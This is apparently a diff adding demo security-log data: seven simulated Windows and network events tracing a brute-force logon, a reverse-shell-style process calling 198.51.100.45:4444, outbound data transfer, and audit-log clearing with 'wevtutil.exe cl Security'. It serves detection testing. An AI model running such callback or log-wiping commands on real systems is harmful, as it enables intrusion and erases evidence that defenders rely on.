@@ -1,0 +1,117 @@
+[
+  {
+    "timestamp": "2026-10-22T10:00:00Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Authentication",
+    "severity": "Medium",
+    "event_name": "Logon Failed - Bad Password (4625)",
+    "username": "b.anderson",
+    "source_ip": "198.51.100.45",
+    "details": {
+      "logon_type": 3,
+      "failure_status": "0xC000006A",
+      "workstation_name": "UNKNOWN_EXTERNAL",
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:00:20Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Authentication",
+    "severity": "Medium",
+    "event_name": "Logon Failed - Bad Password (4625)",
+    "username": "b.anderson",
+    "source_ip": "198.51.100.45",
+    "details": {
+      "logon_type": 3,
+      "failure_status": "0xC000006A",
+      "workstation_name": "UNKNOWN_EXTERNAL",
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:00:40Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Authentication",
+    "severity": "Medium",
+    "event_name": "Logon Failed - Bad Password (4625)",
+    "username": "b.anderson",
+    "source_ip": "198.51.100.45",
+    "details": {
+      "logon_type": 3,
+      "failure_status": "0xC000006A",
+      "workstation_name": "UNKNOWN_EXTERNAL",
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:01:10Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Authentication",
+    "severity": "High",
+    "event_name": "Logon Succeeded (4624)",
+    "username": "b.anderson",
+    "source_ip": "198.51.100.45",
+    "details": {
+      "logon_type": 3,
+      "auth_package": "Kerberos",
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:01:30Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Process",
+    "severity": "High",
+    "event_name": "Process Creation (4688)",
+    "username": "b.anderson",
+    "process_name": "C:\\Users\\banderson\\AppData\\Local\\Temp\\updater_svc.exe",
+    "details": {
+      "command_line": "updater_svc.exe -connect 198.51.100.45:4444",
+      "parent_process": "cmd.exe",
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:02:00Z",
+    "source": "network_flow",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Network",
+    "severity": "High",
+    "event_name": "Outbound Connection to Non-Standard Port",
+    "username": "b.anderson",
+    "destination_ip": "198.51.100.45",
+    "details": {
+      "destination_port": 4444,
+      "protocol": "TCP",
+      "bytes_sent": 84200,
+      "simulated": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-22T10:02:40Z",
+    "source": "winevt_security",
+    "hostname": "dc01.corp.internal",
+    "event_category": "Security",
+    "severity": "Critical",
+    "event_name": "The Audit Log was Cleared (1102)",
+    "username": "b.anderson",
+    "details": {
+      "caller_domain": "CORP",
+      "tool": "wevtutil.exe cl Security",
+      "simulated": true
+    },
+    "is_demo": true
+  }
+]
